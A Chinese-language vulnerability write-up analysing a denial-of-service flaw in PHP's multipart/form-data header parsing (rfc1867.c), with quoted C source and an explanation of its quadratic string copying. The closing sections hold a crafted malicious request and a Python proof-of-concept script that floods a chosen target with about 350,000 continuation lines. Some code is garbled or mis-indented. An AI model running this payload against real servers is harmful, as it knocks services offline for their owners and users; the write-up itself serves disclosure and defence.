# PHP multipart/form-data 远程DOS漏洞

作者：LiuShusheng_0_

0x00 摘要
=======

* * *

PHP解析`multipart/form-datahttp`请求的body part请求头时，重复拷贝字符串导致DOS。远程攻击者通过发送恶意构造的`multipart/form-data`请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。

影响范围：

```
PHP所有版本

```

0x01 漏洞入口
=========

* * *

PHP源码中`main/ rfc1867.c`负责解析`multipart/form-data`协议，DOS漏洞出现在`main/rfc46675pxultipart_buffer_headers`函数。

在详细分析漏洞函数前，先分析进入漏洞函数的路径。PHP解析`multipart/form-data`http请求体的入口函数在`SAPI_POST_HANDLER_FUNC`(rfc1867.c中的函数)，代码如下。

```
/* Get the boundary */
boundary= strstr(content_type_dup, "boundary");
 if(!boundary) {
     intcontent_type_len = strlen(content_type_dup);
     char*content_type_lcase = estrndup(content_type_dup, content_type_len);

     php_strtolower(content_type_lcase,content_type_len);
     boundary= strstr(content_type_lcase, "boundary");
     if(boundary) {
             boundary= content_type_dup + (boundary - content_type_lcase);
     }
     efree(content_type_lcase);
  }
  if(!boundary || !(boundary = strchr(boundary, '='))) {
       sapi_module.sapi_error(E_WARNING,"Missing boundary in multipart/form-data POST data");
       return;
   }
   boundary++;
   boundary_len= strlen(boundary);
   …
   …
   while(!multipart_buffer_eof(mbuff TSRMLS_CC))
   {
                   charbuff[FILLUNIT];
                   char*cd = NULL, *param = NULL, *filename = NULL, *tmp = NULL;
                   size_tblen = 0, wlen = 0;
                   off_toffset;

                   zend_llist_clean(&header);

                   if(!multipart_buffer_headers(mbuff, &header TSRMLS_CC)) {
                            gotofileupload_done;
                   }

```

SAPI_POST_HANDLER_FUNC函数首先解析请求的boundary，

0x02 漏洞函数multipart_buffer_headers执行逻辑
=====================================

* * *

进入漏洞函数，本段先分析漏洞函数的执行逻辑，下一段根据函数执行逻辑详细分析漏洞的原理。`multipart_buffer_headers`函数源码如下：

```
/* parse headers */
static intmultipart_buffer_headers(multipart_buffer *self, zend_llist *header TSRMLS_DC)
{
         char*line;
         mime_header_entryprev_entry = {0}, entry;
         intprev_len, cur_len;

         /*didn't find boundary, abort */
         if(!find_boundary(self, self->boundary TSRMLS_CC)) {
                   return0;
         }

         /*get lines of text, or CRLF_CRLF */

         while((line = get_line(self TSRMLS_CC)) && line[0] != '\0' )
         {
                   /*add header to table */
                   char*key = line;
                   char*value = NULL;

                   if(php_rfc1867_encoding_translation(TSRMLS_C)) {
                            self->input_encoding= zend_multibyte_encoding_detector(line, strlen(line), self->detect_order,self->detect_order_size TSRMLS_CC);
                   }

                   /*space in the beginning means same header */
                   if(!isspace(line[0])) {
                            value= strchr(line, ':');
                   }

                   if(value) {
                            *value= 0;
                            do{ value++; } while(isspace(*value));

                            entry.value= estrdup(value);
                            entry.key= estrdup(key);

                   }else if (zend_llist_count(header)) { /* If no ':' on the line, add to previousline */

                            prev_len= strlen(prev_entry.value);
                            cur_len= strlen(line);

                            entry.value= emalloc(prev_len + cur_len + 1);
                            memcpy(entry.value,prev_entry.value, prev_len);
                            memcpy(entry.value+ prev_len, line, cur_len);
                            entry.value[cur_len+ prev_len] = '\0';

                            entry.key= estrdup(prev_entry.key);

                            zend_llist_remove_tail(header);
                   }else {
                            continue;
                   }

                   zend_llist_add_element(header,&entry);
                   prev_entry= entry;
         }

         return1;
}

```

`multipart_buffer_headers`函数首先找boundary，如果找到boundary就执行以下代码，逐行读取请求的输入以解析body port header:

```
while((line = get_line(self TSRMLS_CC)) && line[0] != '\0' ) { … }

```

当使用get_line读入一行字符，如果该行第一个字符line[0]不是空白字符, 查找line是否存在':'。

如果line存在字符`':'`：

value指向`':'`所在的内存地址。这时if(value)条件成立，成功解析到(header,value)对entry。调用`zend_llist_add_element(header, &entry)`存储，并使用prev_entry记录当前解析到的header，用于解析下一行。

否则，line不存在字符`':'`：

认为这一行的内容是上一行解析到header对应value的值，因此进行合并。合并操作执行以下代码。

```
prev_len= strlen(prev_entry.value);
cur_len= strlen(line);

entry.value= emalloc(prev_len + cur_len + 1); //为合并value重新分片内存
memcpy(entry.value,prev_entry.value, prev_len); //拷贝上一行解析到header对应value
memcpy(entry.value+ prev_len, line, cur_len);   //把当前行作为上一行解析到header的value值，并拷贝到上一行value值得后面。
entry.value[cur_len+ prev_len] = '\0';

entry.key= estrdup(prev_entry.key);

zend_llist_remove_tail(header);

```

首先，为了合并value重新分配内存，接着拷贝上一行解析到的value值到新分配的内容，然后把当前行的字符串作为上一行解析到header的value值，并拷贝到value值得后面。最后调用`zend_llist_remove_tail(header)`删除上一行的记录。执行完后获得了新的entry，调用`zend_llist_add_element(header,&entry)`记录得到的header名值对(header,value)。

0x03 漏洞原理
=========

* * *

在`multipart_buffer_headers`函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符`':'`，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块。该代码块进行1次内存分配，2次内存拷贝，1次内存释放。当value值越来越长，将消耗大量的cpu时间。如果以拷贝一个字节为时间复杂度单位，value的长度为m，时间复杂度为m*m.

```
prev_len= strlen(prev_entry.value);
     cur_len= strlen(line);

     entry.value= emalloc(prev_len + cur_len + 1); //1次分片内存
     memcpy(entry.value,prev_entry.value, prev_len); //1次拷贝
     memcpy(entry.value+ prev_len, line, cur_len);   //1次拷贝
     entry.value[cur_len+ prev_len] = '\0';

     entry.key= estrdup(prev_entry.key);

     zend_llist_remove_tail(header);//1次内存释放

```

0x04 利用
=======

* * *

构造像以下恶意的http请求，当存在350000行`a\n`时，在我的测试环境中，一个http请求将消耗10s的cpu时间。每隔若干秒，同时并发多个请求，将导致server端cpu资源长期耗尽，从而到达DOS。总的来说，利用方式和Hash Collision DOS一样。

```
------WebKitFormBoundarypE33TmSNWwsMphqz
Content-Disposition:form-data; name="file"; filename="s
a
a
a
…
…
…
a"
Content-Type:application/octet-stream

why is it?
------WebKitFormBoundarypE33TmSNWwsMphqz

```

0x05 POC
========

* * *

```
'''
Author: Shusheng Liu,The Department of Security Cloud, Baidu
email: liusscs@163.com
'''
import sys
import urllib,urllib2
import datetime
from optparse import OptionParser

def http_proxy(proxy_url):

    proxy_handler = urllib2.ProxyHandler({"http" : proxy_url})
    null_proxy_handler = urllib2.ProxyHandler({})
    opener = urllib2.build_opener(proxy_handler)
    urllib2.install_opener(opener)
#end http_proxy 

def check_php_multipartform_dos(url,post_body,headers):
    req = urllib2.Request(url)
    for key in headers.keys():
        req.add_header(key,headers[key])
    starttime = datetime.datetime.now();
    fd = urllib2.urlopen(req,post_body)
    html = fd.read()
    endtime = datetime.datetime.now()
    usetime=(endtime - starttime).seconds
    if(usetime > 5):
        result = url+" is vulnerable";
    else:
        if(usetime > 3):
            result = "need to check normal respond time"
    return [result,usetime]
#end


def main():
    #http_proxy("http://127.0.0.1:8089")
    parser = OptionParser()
    parser.add_option("-t", "--target", action="store", 
                  dest="target", 
                  default=False, 
          type="string",
                  help="test target")
    (options, args) = parser.parse_args()
    if(options.target):
    target = options.target
    else:
    return;

    Num=350000
    headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
            'Accept-Encoding':'gzip, deflate',
            'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
    body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
    payload=""
    for i in range(0,Num):
        payload = payload + "a\n"
    body = body + payload;
    body = body + "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
    print "starting...";
    respond=check_php_multipartform_dos(target,body,headers)
    print "Result : "
    print respond[0]
    print "Respond time : "+str(respond[1]) + " seconds";

if __name__=="__main__":
    main()

```